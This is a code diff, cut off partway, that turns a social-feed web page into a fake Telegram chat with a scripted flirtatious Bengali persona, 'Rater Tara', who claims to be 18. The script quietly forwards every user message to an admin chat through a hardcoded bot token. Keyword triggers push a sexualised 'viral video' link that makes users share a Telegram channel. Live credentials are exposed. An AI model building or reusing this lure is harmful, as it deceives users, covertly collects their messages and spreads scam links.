@@ -3,426 +3,326 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Rater Tara 🚷</title>
+    <title>Rater Tara</title>
     
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
-    <!-- Ad SDK -->
-    <script src='//libtl.com/sdk.js' data-zone='10265360' data-sdk='show_10265360'></script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
+        /* --- TELEGRAM UI STYLES --- */
         :root {
-            --primary: #6366f1;
-            --bg-dark: #0f172a;
-            --card-bg: #1e293b;
-            --text-main: #f8fafc;
-            --text-sub: #94a3b8;
-            --border: 1px solid rgba(255, 255, 255, 0.08);
-            --radius: 16px;
+            --tg-header: #517da2; 
+            --tg-bg-top: #d2e4a8;
+            --tg-bg-bottom: #87b588;
+            --bubble-sent: #eeffde;
+            --bubble-recv: #ffffff;
+            --text-color: #000000;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Urbanist', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg-dark); color: var(--text-main); padding-bottom: 90px; }
 
-        /* HEADER */
-        header {
-            background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(10px);
-            position: sticky; top: 0; z-index: 100; padding: 12px 20px;
-            border-bottom: var(--border); display: flex; justify-content: space-between; align-items: center;
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Roboto', sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            background-color: var(--tg-bg-bottom);
         }
-        .brand { display: flex; align-items: center; gap: 10px; }
-        .logo-img { width: 40px; height: 40px; border-radius: 10px; }
-        .logo-text { font-size: 20px; font-weight: 800; background: linear-gradient(to right, #818cf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .user-mini { width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--primary); }
 
-        /* CREATE POST BOX */
-        .create-box {
-            background: var(--card-bg); margin: 15px; padding: 15px; border-radius: var(--radius); border: var(--border);
+        /* Background */
+        .chat-background {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(180deg, var(--tg-bg-top) 0%, var(--tg-bg-bottom) 100%);
         }
-        .cb-top { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
-        .cb-input { 
-            width: 100%; background: #0f172a; border: 1px solid #334155; 
-            padding: 12px; border-radius: 20px; color: white; outline: none; 
+        .chat-pattern {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image: url('https://web.telegram.org/img/bg_0.png'); 
+            background-size: 500px;
+            opacity: 0.4; mix-blend-mode: overlay;
         }
-        .cb-actions { display: flex; justify-content: space-between; align-items: center; }
-        .cb-media-btn { color: #38bdf8; font-size: 20px; cursor: pointer; display: flex; gap: 15px; }
-        .post-submit-btn { background: var(--primary); color: white; border: none; padding: 8px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; }
-        .preview-area img, .preview-area video { max-width: 100%; border-radius: 10px; margin-top: 10px; display: none; }
 
-        /* POST CARD */
-        .card { background: var(--card-bg); border-radius: var(--radius); margin: 0 15px 20px; padding: 16px; border: var(--border); }
-        .post-header { display: flex; gap: 10px; margin-bottom: 10px; align-items: center; }
-        .p-avatar { width: 45px; height: 45px; border-radius: 50%; }
-        .p-info h4 { font-size: 16px; margin: 0; }
-        .p-info span { font-size: 12px; color: var(--text-sub); }
-        .p-media { width: 100%; border-radius: 12px; margin-top: 10px; }
-        .p-actions { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 10px; border-top: var(--border); }
-        .act-btn { color: var(--text-sub); display: flex; align-items: center; gap: 5px; cursor: pointer; font-size: 13px; }
-        .act-btn.liked { color: #f43f5e; }
-
-        /* EDIT BOX */
-        .edit-box { display: none; margin-top: 10px; background: #0f172a; padding: 10px; border-radius: 10px; }
-
-        /* COMMENTS */
-        .comment-box { display: none; margin-top: 10px; background: #0f172a; padding: 10px; border-radius: 10px; }
-        .single-comm { font-size: 13px; margin-bottom: 5px; }
-        .comm-input-wrap { display: flex; gap: 10px; margin-top: 10px; }
-
-        /* BOTTOM NAV */
-        .nav-bar {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 400px; background: rgba(30, 41, 59, 0.9);
-            backdrop-filter: blur(10px); display: flex; justify-content: space-around;
-            padding: 12px 0; border-radius: 24px; border: var(--border); z-index: 100;
+        /* Header */
+        .header {
+            background-color: var(--tg-header);
+            height: 56px; display: flex; align-items: center;
+            padding: 0 10px; color: white;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2); z-index: 100;
+            cursor: pointer;
         }
-        .nav-icon { font-size: 22px; color: var(--text-sub); padding: 10px; border-radius: 50%; transition: 0.3s; }
-        .nav-icon.active { background: var(--primary); color: white; transform: translateY(-5px); }
+        .back-btn { padding: 10px; font-size: 18px; margin-right: 5px; }
+        .profile-pic { width: 40px; height: 40px; border-radius: 50%; margin-right: 15px; background: #fff; object-fit: cover; }
+        .header-info { flex: 1; display: flex; flex-direction: column; }
+        .chat-title { font-size: 19px; font-weight: 600; }
+        .chat-status { font-size: 14px; opacity: 0.8; }
+        .menu-btn { padding: 10px; font-size: 18px; }
 
-        /* MODALS */
-        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index: 2000; display:flex; justify-content:center; align-items:center; }
-        .auth-card { background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; border: var(--border); }
+        /* Chat Area */
+        .chat-content {
+            flex: 1; overflow-y: auto; padding: 10px;
+            display: flex; flex-direction: column;
+            scroll-behavior: smooth;
+            padding-bottom: 60px;
+        }
+        .date-badge {
+            align-self: center; background: rgba(0,0,0,0.3); color: white;
+            padding: 5px 12px; border-radius: 16px; font-size: 13px;
+            margin: 15px 0; font-weight: 500;
+        }
+
+        /* Bubbles */
+        .message-row { display: flex; width: 100%; margin-bottom: 6px; }
+        .sent { justify-content: flex-end; }
+        .recv { justify-content: flex-start; }
+
+        .bubble {
+            max-width: 80%; padding: 8px 10px 6px 10px;
+            border-radius: 8px; font-size: 16px; position: relative;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.2); line-height: 1.5;
+            word-wrap: break-word;
+        }
+        .bubble-sent { background: var(--bubble-sent); border-radius: 12px 12px 0 12px; }
+        .bubble-recv { background: var(--bubble-recv); border-radius: 0 12px 12px 12px; }
+
+        .bubble-time {
+            float: right; font-size: 11px; margin-top: 6px; margin-left: 8px;
+            display: flex; align-items: center; gap: 3px; color: #559c55;
+        }
         
-        .page-section { display: none; padding-top: 10px; }
-        .page-section.active { display: block; }
-
-        /* SUPPORT BUTTON */
-        .support-btn {
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            color: white; text-decoration: none; padding: 12px;
-            border-radius: 15px; font-weight: 700; margin-top: 20px;
-            box-shadow: 0 5px 15px rgba(99, 102, 241, 0.3);
+        /* MAGIC LINK BUTTON */
+        .magic-link-btn {
+            display: block; margin-top: 10px; padding: 10px 15px;
+            background: linear-gradient(90deg, #0088cc, #3390ec);
+            color: white; border-radius: 8px; text-decoration: none;
+            font-size: 14px; font-weight: bold; text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2); animation: pulse 2s infinite;
         }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+
+        /* Input Area */
+        .input-area {
+            background: white; min-height: 50px; display: flex;
+            align-items: center; padding: 5px 8px; gap: 10px; z-index: 100;
+        }
+        .input-icon { color: #889299; font-size: 24px; padding: 8px; cursor: pointer; }
+        .msg-input { flex: 1; border: none; outline: none; font-size: 17px; padding: 5px; font-family: 'Roboto', sans-serif; }
+        
+        /* Emoji Drawer */
+        .emoji-drawer {
+            height: 0; background: #e6ebee; overflow-y: auto;
+            transition: height 0.3s ease; display: grid;
+            grid-template-columns: repeat(8, 1fr); padding: 0;
+            border-top: 1px solid #ccc;
+        }
+        .emoji-drawer.open { height: 200px; padding: 10px; }
+        .emoji-btn { font-size: 24px; cursor: pointer; text-align: center; padding: 10px; }
+
     </style>
 </head>
 <body>
 
-<script type="text/javascript">
-  atOptions = {
-  	'key' : '73aebbc5e096d89876e20d14b6465650',
-  	'format' : 'iframe',
-  	'height' : 50,
-  	'width' : 320,
-  	'params' : {}
-  };
-</script>
-<script
-  type="text/javascript"
-  src="//www.highperformanceformat.com/73aebbc5e096d89876e20d14b6465650/invoke.js"
-></script>
+    <div class="chat-background"><div class="chat-pattern"></div></div>
 
-<div id="container-51246ba2e0f7773d3c8b96e5f2a51a36"></div>
-    <!-- AUTH MODAL -->
-    <div id="authModal" class="modal">
-        <div class="auth-card">
-            <h2 style="color:white; margin-bottom:10px;">Rater Tara</h2>
-            <script async src="https://telegram.org/js/telegram-widget.js?22" 
-                    data-telegram-login="ratertara_bot" data-size="large" data-userpic="true" data-radius="12" 
-                    data-onauth="onTelegramAuth(user)" data-request-access="write"></script>
-            <p style="margin:15px 0; color:#aaa;">OR</p>
-            <input type="text" id="setupName" placeholder="Your Name" class="cb-input" style="margin-bottom:10px;">
-            <input type="text" id="setupUser" placeholder="@username" class="cb-input" style="margin-bottom:15px;">
-            <button onclick="manualSave()" class="post-submit-btn" style="width:100%;">Login Guest</button>
+    <!-- Header -->
+    <div class="header">
+        <i class="fas fa-arrow-left back-btn"></i>
+        <img src="https://i.ibb.co/3kXjQ1d/girl-demo.jpg" class="profile-pic" onerror="this.src='https://cdn-icons-png.flaticon.com/512/4712/4712035.png'">
+        <div class="header-info">
+            <div class="chat-title">Rater Tara</div>
+            <div class="chat-status" id="botStatus">online</div>
         </div>
+        <i class="fas fa-ellipsis-v menu-btn"></i>
     </div>
 
-    <header>
-        <div class="brand">
-            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgHegSTsXVIOKWGvuBgmXMgDgEqL_VbRaCtNwi8hOq8BgW1uGxounxjFaZ0-kA47Ula273x0iCbCESPayuX1OU8uX0DNPHxTPHRp_rw2tKRZKSH5jBZUHPZraME07cIz0sbvDjOVUmPI5FXa1sn2DsR7e4ZhFGYZuqYC6AXV8Txdw3Cz2XcOzqDoQAJDVI=s640" class="logo-img">
-            <div class="logo-text">Rater Tara</div>
-        </div>
-        <img id="headerAvatar" src="" class="user-mini" onclick="switchTab('profile')">
-    </header>
-
-    <!-- HOME FEED -->
-    <div id="home" class="page-section active">
-        <!-- USER CREATE POST BOX -->
-        <div class="create-box">
-            <div class="cb-top">
-                <img id="postAvatar" src="" class="user-mini">
-                <input type="text" id="userPostText" class="cb-input" placeholder="What's on your mind?">
-            </div>
-            <div class="preview-area" id="previewBox"></div>
-            <div class="cb-actions">
-                <div class="cb-media-btn">
-                    <label><i class="fas fa-image" style="color:#4ade80;"></i><input type="file" hidden accept="image/*" onchange="handleUserMedia(this, 'image')"></label>
-                    <label><i class="fas fa-video" style="color:#f472b6;"></i><input type="file" hidden accept="video/*" onchange="handleUserMedia(this, 'video')"></label>
-                </div>
-                <button onclick="publishUserPost()" class="post-submit-btn">Post</button>
-            </div>
-        </div>
-
-        <div id="feedContainer"></div>
+    <!-- Chat Content -->
+    <div class="chat-content" id="chatBox">
+        <div class="date-badge">Today</div>
     </div>
 
-    <!-- OTHER SECTIONS -->
-    <div id="search" class="page-section">
-        <div class="card" style="min-height:80vh">
-            <h3>Find Users</h3>
-            <input type="text" id="searchInput" class="cb-input" placeholder="Search..." onkeyup="searchUsers()" style="margin-top:10px;">
-            <div id="searchResults" style="margin-top:20px;"></div>
-        </div>
+    <!-- Input Area -->
+    <div class="input-area">
+        <i class="far fa-smile input-icon" onclick="toggleEmojiDrawer()"></i>
+        <input type="text" id="msgInput" class="msg-input" placeholder="Message" autocomplete="off" oninput="toggleIcon()">
+        <i class="fas fa-microphone input-icon" id="micIcon" onclick="autoSendVoice()"></i>
+        <i class="fas fa-paper-plane input-icon" id="sendIcon" style="display:none; color:#517da2;" onclick="handleUserMessage()"></i>
     </div>
 
-    <!-- PROFILE SECTION UPDATED WITH SUPPORT LINK -->
-    <div id="profile" class="page-section">
-        <div class="card" style="text-align:center; padding:30px;">
-            <img id="profileAvatar" src="" style="width:100px; height:100px; border-radius:50%; border:3px solid var(--primary);">
-            <h2 id="profileName" style="margin-top:10px;">User</h2>
-            <p id="profileUser" style="color:#aaa;">@user</p>
-            <div id="profileID" style="background:#334155; display:inline-block; padding:5px 10px; border-radius:10px; margin-top:10px; font-size:12px;">ID: 000</div>
-            
-            <!-- SUPPORT TEAM BUTTON DIRECT LINK -->
-            <a href="https://t.me/+-_yWNzhPb_c4OTg1" target="_blank" class="support-btn">
-                <i class="fas fa-headset"></i> Support Team
-            </a>
-
-            <button onclick="localStorage.removeItem('rt_user_pro'); location.reload()" style="margin-top:20px; background:#ef4444; color:white; border:none; padding:10px 20px; border-radius:10px;">Logout</button>
-        </div>
-    </div>
-
-    <!-- NAV -->
-    <div class="nav-bar">
-        <div class="nav-icon active" onclick="switchTab('home', this)"><i class="fas fa-home"></i></div>
-        <div class="nav-icon" onclick="switchTab('search', this)"><i class="fas fa-search"></i></div>
-        <div class="nav-icon" onclick="switchTab('profile', this)"><i class="fas fa-user"></i></div>
-    </div>
+    <div class="emoji-drawer" id="emojiDrawer"></div>
 
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDyUvmII8y3HAUDyUpkIDRAgqeFlqBP2eU",
-            authDomain: "rater-tara-bot.firebaseapp.com",
-            databaseURL: "https://rater-tara-bot-default-rtdb.firebaseio.com",
-            projectId: "rater-tara-bot",
-            storageBucket: "rater-tara-bot.firebasestorage.app",
-            messagingSenderId: "212269572985",
-            appId: "1:212269572985:web:0a2b21553a514af99485a8"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        // CONFIG
+        const BOT_TOKEN = "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA";
+        const ADMIN_CHAT_ID = "-1003119670905";
+        
+        // YOUR SPECIFIC SHARE LINK
+        const VIRAL_LINK = "https://t.me/share/url?url=https://t.me/VairalNadiya&text=💙%20নাদিয়া%20Ultra%20Viral%20ভিডিও%20দেখুন%20—%20Blue%20Edition";
 
-        let currentUser = null;
-        let userMedia = { type: null, data: null };
-        const defPhoto = "https://blogger.googleusercontent.com/img/a/AVvXsEgHegSTsXVIOKWGvuBgmXMgDgEqL_VbRaCtNwi8hOq8BgW1uGxounxjFaZ0-kA47Ula273x0iCbCESPayuX1OU8uX0DNPHxTPHRp_rw2tKRZKSH5jBZUHPZraME07cIz0sbvDjOVUmPI5FXa1sn2DsR7e4ZhFGYZuqYC6AXV8Txdw3Cz2XcOzqDoQAJDVI=s640";
+        // --- EMOJIS ---
+        const emojis = ["😀","😂","😍","🔥","😭","👍","👎","❤️","💋","💍","🚀","💎"];
+        const drawer = document.getElementById('emojiDrawer');
+        emojis.forEach(e => {
+            let span = document.createElement('span');
+            span.className = 'emoji-btn'; span.innerText = e;
+            span.onclick = () => { document.getElementById('msgInput').value += e; toggleIcon(); };
+            drawer.appendChild(span);
+        });
+        function toggleEmojiDrawer() { drawer.classList.toggle('open'); document.getElementById('chatBox').scrollTop = 9999; }
 
-        // AUTH
-        const stored = localStorage.getItem('rt_user_pro');
-        if(stored) {
-            currentUser = JSON.parse(stored);
-            document.getElementById('authModal').style.display = 'none';
-            initUI();
-        }
-
-        function onTelegramAuth(user) {
-            saveUser({ name: user.first_name, username: "@"+user.username, id: user.id.toString(), photo: user.photo_url || defPhoto });
-        }
-        function manualSave() {
-            const n = document.getElementById('setupName').value;
-            const u = document.getElementById('setupUser').value;
-            if(n && u) saveUser({ name: n, username: u, id: "U"+Math.floor(Math.random()*90000), photo: defPhoto });
-        }
-        function saveUser(u) {
-            currentUser = u;
-            localStorage.setItem('rt_user_pro', JSON.stringify(u));
-            db.ref('users/'+u.id).update(u);
-            location.reload();
-        }
-
-        function initUI() {
-            document.getElementById('headerAvatar').src = currentUser.photo;
-            document.getElementById('postAvatar').src = currentUser.photo;
-            document.getElementById('profileAvatar').src = currentUser.photo;
-            document.getElementById('profileName').innerText = currentUser.name;
-            document.getElementById('profileUser').innerText = currentUser.username;
-            document.getElementById('profileID').innerText = "ID: " + currentUser.id;
-            listenFeed();
-        }
-
-        function switchTab(id, el) {
-            document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            if(el) {
-                document.querySelectorAll('.nav-icon').forEach(n => n.classList.remove('active'));
-                el.classList.add('active');
-            }
-        }
-
-        // POSTING
-        function handleUserMedia(input, type) {
-            const file = input.files[0];
-            if(file) {
-                const reader = new FileReader();
-                reader.onload = e => {
-                    userMedia = { type: type, data: e.target.result };
-                    const box = document.getElementById('previewBox');
-                    box.innerHTML = type === 'image' ? `<img src="${e.target.result}" style="display:block">` : `<video src="${e.target.result}" style="display:block" controls></video>`;
-                }
-                reader.readAsDataURL(file);
-            }
-        }
-
-        function publishUserPost() {
-            const text = document.getElementById('userPostText').value;
-            if(!text && !userMedia.data) return alert("Write something or add media!");
-            
-            const post = {
-                userName: currentUser.name,
-                userPhoto: currentUser.photo,
-                userId: currentUser.id,
-                text: text,
-                mediaType: userMedia.type,
-                mediaData: userMedia.data,
-                time: new Date().toLocaleTimeString(),
-                likes: 0
-            };
-            
-            db.ref('posts').push(post).then(() => {
-                alert("Posted successfully!");
-                document.getElementById('userPostText').value = "";
-                document.getElementById('previewBox').innerHTML = "";
-                userMedia = { type: null, data: null };
-            });
-        }
-
-        // FEED
-        function listenFeed() {
-            db.ref('posts').limitToLast(30).on('child_added', snap => renderPost(snap.val(), snap.key, true));
-            db.ref('posts').limitToLast(30).on('child_changed', snap => updatePost(snap.key, snap.val()));
-        }
-
-        function renderPost(post, key, prepend) {
-            const likes = post.likes || {};
-            const isLiked = likes[currentUser.id] ? 'liked' : '';
-            const cnt = Object.keys(likes).length || 'Like';
-            
-            const media = post.mediaType === 'image' ? `<img src="${post.mediaData}" class="p-media" loading="lazy">` : (post.mediaType === 'video' ? `<video src="${post.mediaData}" controls class="p-media" loading="lazy"></video>` : '');
-            
-            // EDIT BUTTON VISIBILITY (Only if current user owns the post)
-            const editBtn = (post.userId === currentUser.id) ? `<div class="act-btn" onclick="toggleEdit('${key}')"><i class="fas fa-edit"></i> Edit</div>` : '';
-
-            const html = `
-                <div class="card" id="post-${key}">
-                    <div class="post-header">
-                        <img src="${post.userPhoto}" class="p-avatar">
-                        <div class="p-info"><h4>${post.userName}</h4><span>${post.time}</span></div>
-                    </div>
-                    
-                    <div id="post-text-${key}">${post.text}</div> 
-                    
-                    <!-- EDIT BOX -->
-                    <div id="edit-box-${key}" class="edit-box">
-                        <input id="edit-in-${key}" class="cb-input" value="${post.text}">
-                        <button onclick="saveEdit('${key}')" class="post-submit-btn" style="margin-top:10px; font-size:12px;">Update</button>
-                        <button onclick="toggleEdit('${key}')" class="post-submit-btn" style="background:#475569; margin-left:5px; font-size:12px;">Cancel</button>
-                    </div>
-
-                    ${media}
-                    
-                    <div class="p-actions">
-                        <div class="act-btn ${isLiked}" id="like-${key}" onclick="doLike('${key}')"><i class="${isLiked?'fas':'far'} fa-heart"></i> <span>${cnt}</span></div>
-                        <div class="act-btn" onclick="toggleComm('${key}')"><i class="far fa-comment"></i> Comment</div>
-                        <div class="act-btn" onclick="sharePost('${post.text}')"><i class="fas fa-share"></i> Share</div>
-                        ${editBtn}
-                    </div>
-                    <div id="comm-box-${key}" class="comment-box">
-                        <div id="comm-list-${key}">${getCommHtml(post.comments)}</div>
-                        <div class="comm-input-wrap">
-                            <input id="in-${key}" class="cb-input" placeholder="Write comment...">
-                            <button onclick="doComm('${key}')" class="post-submit-btn"><i class="fas fa-paper-plane"></i></button>
-                        </div>
-                    </div>
-                </div>`;
-            const c = document.getElementById('feedContainer');
-            if(prepend) c.insertAdjacentHTML('afterbegin', html); else c.insertAdjacentHTML('beforeend', html);
-        }
-
-        function updatePost(key, post) {
-            // Update Likes
-            const likes = post.likes || {};
-            const isLiked = likes[currentUser.id];
-            const btn = document.getElementById(`like-${key}`);
-            if(btn) {
-                btn.className = `act-btn ${isLiked?'liked':''}`;
-                btn.querySelector('i').className = isLiked?'fas fa-heart':'far fa-heart';
-                btn.querySelector('span').innerText = Object.keys(likes).length || 'Like';
-            }
-            // Update Text (if edited)
-            const txtDiv = document.getElementById(`post-text-${key}`);
-            if(txtDiv) txtDiv.innerText = post.text;
-            
-            // Update Comments
-            const clist = document.getElementById(`comm-list-${key}`);
-            if(clist) clist.innerHTML = getCommHtml(post.comments);
-        }
-
-        // --- EDIT FUNCTIONS ---
-        function toggleEdit(key) {
-            const box = document.getElementById(`edit-box-${key}`);
-            const txt = document.getElementById(`post-text-${key}`);
-            if(box.style.display === 'block') {
-                box.style.display = 'none';
-                txt.style.display = 'block';
+        // --- CORE FUNCTIONS ---
+        function toggleIcon() {
+            const val = document.getElementById('msgInput').value;
+            const mic = document.getElementById('micIcon');
+            const send = document.getElementById('sendIcon');
+            if (val.trim().length > 0) {
+                mic.style.display = 'none'; send.style.display = 'block';
             } else {
-                box.style.display = 'block';
-                txt.style.display = 'none';
+                mic.style.display = 'block'; send.style.display = 'none';
             }
         }
-        function saveEdit(key) {
-            const newText = document.getElementById(`edit-in-${key}`).value;
-            db.ref(`posts/${key}`).update({ text: newText });
-            toggleEdit(key);
-        }
-        // ----------------------
 
-        function getCommHtml(comms) {
-            if(!comms) return '';
-            return Object.values(comms).map(c => `<div class="single-comm"><b>${c.name}:</b> ${c.text}</div>`).join('');
+        function getTime() {
+            const now = new Date();
+            let h = now.getHours(), m = now.getMinutes();
+            const ampm = h >= 12 ? 'PM' : 'AM';
+            h = h % 12 || 12; m = m < 10 ? '0'+m : m;
+            return h + ':' + m + ' ' + ampm;
         }
 
-        function doLike(key) {
-            const ref = db.ref(`posts/${key}/likes/${currentUser.id}`);
-            ref.once('value', s => { if(s.exists()) ref.remove(); else ref.set(true); });
+        function addMessage(type, text) {
+            const chatBox = document.getElementById('chatBox');
+            const row = document.createElement('div');
+            row.className = `message-row ${type}`;
+            const checks = type === 'sent' ? '<i class="fas fa-check checks" style="font-size:10px;"></i>' : '';
+            
+            row.innerHTML = `<div class="bubble bubble-${type}">${text}<div class="bubble-time">${getTime()} ${checks}</div></div>`;
+            chatBox.appendChild(row);
+            chatBox.scrollTop = chatBox.scrollHeight;
+
+            if(type === 'sent') {
+                setTimeout(() => {
+                    const icon = row.querySelector('.checks');
+                    if(icon) { icon.classList.remove('fa-check'); icon.classList.add('fa-check-double'); }
+                }, 1000);
+            }
         }
-        function toggleComm(key) {
-            const b = document.getElementById(`comm-box-${key}`);
-            b.style.display = b.style.display==='block'?'none':'block';
+
+        function handleUserMessage() {
+            const input = document.getElementById('msgInput');
+            const text = input.value.trim();
+            if (!text) return;
+            
+            addMessage("sent", text);
+            input.value = ""; toggleIcon(); drawer.classList.remove('open');
+            
+            // Send to Admin
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent("User: " + text)}`).catch(e=>{});
+
+            // Trigger Logic
+            replyAsRaterTara(text);
         }
-        function doComm(key) {
-            const v = document.getElementById(`in-${key}`).value;
-            if(v) { db.ref(`posts/${key}/comments`).push({name:currentUser.name, text:v}); document.getElementById(`in-${key}`).value=''; }
+
+        function autoSendVoice() {
+            addMessage("sent", `<i class="fas fa-play"></i> Voice Message (0:05)`);
+            setTimeout(() => replyAsRaterTara("voice_msg"), 2000);
         }
-        function sharePost(txt) {
-            const url = window.location.href;
-            if(navigator.share) navigator.share({title:'Check this', text:txt, url:url});
-            else { navigator.clipboard.writeText(txt + " " + url); alert("Link Copied!"); }
+
+        function replyAsRaterTara(inputText) {
+            const botStatus = document.getElementById('botStatus');
+            botStatus.innerText = "typing...";
+            const delay = Math.floor(Math.random() * 800) + 600;
+
+            setTimeout(() => {
+                botStatus.innerText = "online";
+                const response = getSmartResponse(inputText.toLowerCase());
+                addMessage("recv", response);
+            }, delay);
         }
-        function searchUsers() {
-            const q = document.getElementById('searchInput').value.toLowerCase();
-            const r = document.getElementById('searchResults');
-            r.innerHTML = '';
-            if(q.length<1) return;
-            db.ref('users').once('value', s => {
-                s.forEach(c => {
-                    const u = c.val();
-                    if((u.name && u.name.toLowerCase().includes(q)) || (u.id && u.id.includes(q))) {
-                        r.innerHTML += `<div style="display:flex; gap:10px; align-items:center; padding:10px; border-bottom:1px solid #333;">
-                            <img src="${u.photo}" style="width:40px; height:40px; border-radius:50%">
-                            <div><b>${u.name}</b><br><small>${u.username}</small></div>
-                        </div>`;
-                    }
-                })
-            })
+
+        // --- UPDATED BRAIN (Fixing the issue) ---
+        function getSmartResponse(text) {
+            
+            const linkBtn = `<br><a href="${VIRAL_LINK}" target="_blank" class="magic-link-btn"><i class="fas fa-play-circle"></i> 💙 নাদিয়া ভাইরাল ভিডিও দেখুন</a>`;
+
+            // 1. VIDEO / LINK REQUEST (Highest Priority)
+            // Added Bangla keywords: ভিডিও, লিংক, লিঙ্ক, ভাইরাল, হট
+            if(text.includes('video') || text.includes('ভিডিও') || text.includes('link') || text.includes('লিংক') || text.includes('লিঙ্ক') || text.includes('viral') || text.includes('ভাইরাল') || text.includes('hot') || text.includes('হট') || text.includes('blue') || text.includes('dao') || text.includes('দাও')) {
+                return "এইতো লাইনে এসেছো! নাদিয়ার সেই ব্লু এডিশন ভিডিওটা আমি খুঁজে পেয়েছি। তুমি কি দেখতে চাও? তাহলে জলদি নিচের লিংকে ক্লিক করো..." + linkBtn;
+            }
+
+            // 2. NAME / IDENTITY (নাম)
+            // Added Bangla keywords: নাম, পরিচয়, কে তুমি
+            if(text.includes('nam') || text.includes('name') || text.includes('নাম') || text.includes('parichoy') || text.includes('পরিচয়') || text.includes('ke tumi')) {
+                return "আমার নাম 'রাতের তারা'। তোমার স্বপ্নের রাজকন্যা! ✨";
+            }
+
+            // 3. HOME / LOCATION (বাড়ি)
+            // Added Bangla keywords: বাড়ি, বাসা, থাকো, গ্রাম
+            if(text.includes('bari') || text.includes('বাড়ি') || text.includes('basa') || text.includes('বাসা') || text.includes('thako') || text.includes('থাকো') || text.includes('gram') || text.includes('গ্রাম')) {
+                return "আমার বাড়ি 'স্বপ্নপুরী' গ্রামে। কিন্তু এখন আমি তোমার মনের নীল খামে বন্দি আছি! 💌";
+            }
+
+            // 4. AGE (বয়স)
+            if(text.includes('boyosh') || text.includes('age') || text.includes('বয়স')) {
+                return "মেয়েদের বয়স জানতে নেই বাবু! তবে আমি ১৮ বছরের সুইট একটা মেয়ে 😉";
+            }
+
+            // 5. GREETINGS (হ্যালো/হাই)
+            if(text.match(/^(hi|hello|hey|salam|assalamualaikum|hlo|হাই|হ্যালো|সালাম|আসসালামু)$/i)) {
+                return "হাই বাবু! কেমন আছো তুমি? তোমার মেসেজের অপেক্ষায় ছিলাম! ❤️";
+            }
+
+            // 6. WELLBEING (কেমন আছো)
+            if(text.includes('kemon') || text.includes('কেমন') || text.includes('valo') || text.includes('ভালো') || text.includes('khobor') || text.includes('খবর')) {
+                return "আমি তো সবসময় ভালো থাকি, তোমাকে দেখলে আরও ভালো হয়ে যাই! তুমি কেমন?";
+            }
+
+            // 7. EATING (খাওয়া দাওয়া)
+            if(text.includes('khabar') || text.includes('khaba') || text.includes('kheyecho') || text.includes('khao') || text.includes('খেয়েছো') || text.includes('খাবার')) {
+                return "হুম খেয়েছি বাবু। তুমি খেয়েছো? না খেলে খেয়ে নাও লক্ষ্মীটি ❤️";
+            }
+
+            // 8. DOING (কি করো)
+            if(text.includes('ki koro') || text.includes('কি করো') || text.includes('ki korso') || text.includes('koro') || text.includes('ব্যস্ত') || text.includes('busy')) {
+                return "তোমার কথাই ভাবছিলাম... তুমি কি করছো? আমাকে মিস করছিলে? 🙈";
+            }
+
+            // 9. LOVE (ভালোবাসা)
+            if(text.includes('love') || text.includes('bhalobashi') || text.includes('ভালোবাসি') || text.includes('prem') || text.includes('প্রেম')) {
+                return "ওমা! তুমি আমাকে ভালোবাসো? সত্যি বলছো নাকি মন ভোলানো কথা? 🙈❤️";
+            }
+
+            // 10. MARRIAGE (বিয়ে)
+            if(text.includes('biye') || text.includes('বিয়ে') || text.includes('marry') || text.includes('bou') || text.includes('বউ')) {
+                return "বিয়ে? ওরে বাবা! এখনই? আমার তো রান্নাবান্না শেখাই হয়নি! তুমি রান্না পারবে তো? 🍳";
+            }
+
+            // 11. PIC (ছবি)
+            if(text.includes('pic') || text.includes('chobi') || text.includes('photo') || text.includes('ছবি') || text.includes('ফটো')) {
+                return "আমার ছবি? আমার পার্সোনাল ছবি তো সবাইকে দেই না। তুমি যদি আমার স্পেশাল কেউ হতে চাও, তবে এই লিংকটা শেয়ার করো..." + linkBtn;
+            }
+
+            // 12. NUMBER (নাম্বার)
